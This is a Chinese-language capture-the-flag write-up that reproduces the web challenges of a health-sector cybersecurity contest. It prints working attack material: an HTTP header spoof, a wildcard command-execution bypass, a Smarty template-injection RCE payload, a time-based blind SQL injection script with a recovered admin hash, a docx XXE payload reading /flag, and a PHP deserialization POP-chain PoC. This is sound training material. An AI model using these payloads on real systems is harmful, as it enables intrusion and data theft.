

# 前言

比赛是第二届全国卫生健康行业网络安全技能大赛，赛后借了个账号复现了一下Web题，整体偏简单叭，做到CMS那题的时候环境关了。

# 签到

f12，拿到flag。

# easy_web1

f12发现`There_is_no_flag_here.php`，再f12提示本地访问：

```
Client-ip:127.0.0.1
```

即可得到flag。



# easy_web2

ctfshow上的原题，直接打了：

```php
?shell=/???/????64 /????????
```

然后base64解码即可。



# super_hacker

```
 Via 头需要有值；X-Forwarded-For 存在smarty的模板注入
```

也简单，Via头给个值，然后发现页面地下存在ip的回显，经过测试时x-forwarded-for的值。存在smarty的模板注入，似乎过滤了一些东西，经过一系列fuzz成功rce：

```php
{assert('assert($_GET[0])')}
```



然后拿flag即可。



# 病例管理系统

sql注入进后台，写个python跑一下：

```python
"""
Author:feng
"""
import requests
from time import *
url='http://eci-2zebvabc2wy8k9x8jvue.cloudeci1.ichunqiu.com:80'
flag=''
for i in range(1,10000000):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break
        payload="||if(ascii(substr(password,{},1))<{},sleep(0.5),1)#".format(i,j)
        data={
            'username':'\\',
            'password':payload
        }
        try:
            r=requests.post(url=url,data=data,timeout=0.4)
            #print(r.text)
            min = j
        except:
            max = j
        sleep(0.2)

"admin"
"2447daf21339563964a78b2164574af4"
```





后台有个文件上传只能传docx，联想到docx的xxe。根据提示：

```
注意模板的docx文件是怎么得到title的
```

页面中会有这个：

```
<strong><a href='uploads/.'>标题：None</a></strong></br></br><strong><a href='uploads/..'>标题：None</a></strong></br></br><strong><a href='uploads/moban.docx'>标题：moban</a>
```

moban.docx显示了标题是moban，自己上传docx的话显示的是None。



经过fuzz，发现标题取自这里：

![img](D:\this_is_feng\github\CTF\Web\picture\pic33.png)



再经过测试，发现这个title是在core.xml。

![img](D:\this_is_feng\github\CTF\Web\picture\pic32.png)



联想到docx的xxe：

https://blog.51cto.com/0x007/1630640

后端会解析这个xml，然后得到这个`<dc:title>`的内容，因此xxe读/flag。

直接在最前面加上：

```
<!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///flag">]>
```

然后`<db:title>`的内容改成`&xxe;`

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///flag">]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>&xxe;</dc:title><dc:subject></dc:subject><dc:creator>1</dc:creator><cp:keywords></cp:keywords><dc:description></dc:description><cp:lastModifiedBy>1</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2021-07-11T05:56:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2021-07-11T05:56:00Z</dcterms:modified></cp:coreProperties>
```



上传即可得到flag。





# medical

```
反序列化字符串逃逸；static目录下面有源码泄露；php的反序列化
```

static目录下有www.zip，下载下来发现是个MVC。

大致审计一下，发现反序列化入口点在`Service.class.php`：

```php
    public function index(){
        $serialize_data=serialize($this->post);
        if(santi($serialize_data)){
            $data = unserialize(preg_replace('/s:/', 'S:', $serialize_data));
            $this->view->user_view($data['Location']);
        }else{
            $this->view->user_view("Bad strings.");
        }
    }
```

反序列化得到的`$data['Location']`被`user_view()`函数处理，跟进一下就会发现是被当成字符串了，所以跟进到一个`__toString`。全局查找一下发现了`Request.class.php`的可以用：

```php
    public function __toString(){
        return $this->hhhhh->b;
    }
```

这里的`$this->hhhhh`可控，因此还可以进入一个`__get`，找到了`Index.class.php`：

```php
    public function __get($name){
        return file_get_contents('/flag');
    }
```

即可得到flag。至此反序列化的链理清楚了，想办法怎么反序列化。

```php
        $serialize_data=serialize($this->post);
        if(santi($serialize_data)){
            $data = unserialize(preg_replace('/s:/', 'S:', $serialize_data));
            $this->view->user_view($data['Location']);
```

存在一个替换的的过程，联想到用十六进制可以进行字符串的逃逸，稍微构造一下即可，这里不细说了，也不难，POC：

```php
<?php
class Request
{
    public $hhhhh;
    public function __construct(){
        $this->hhhhh = new Index();
    }
}

class Index
{

}
echo serialize(new Request());
```



```
a=\31\31\31\31\31\31\31\31\31\31\31&Location=;s:8:"Location";O:7:"Request":1:{s:5:"hhhhh";O:5:"Index":0:{}}}
```



![pic31](D:\this_is_feng\github\CTF\Web\picture\pic31.png)



# easy_cms

当时没来得及看，去复现的时候题目环境已经关了。















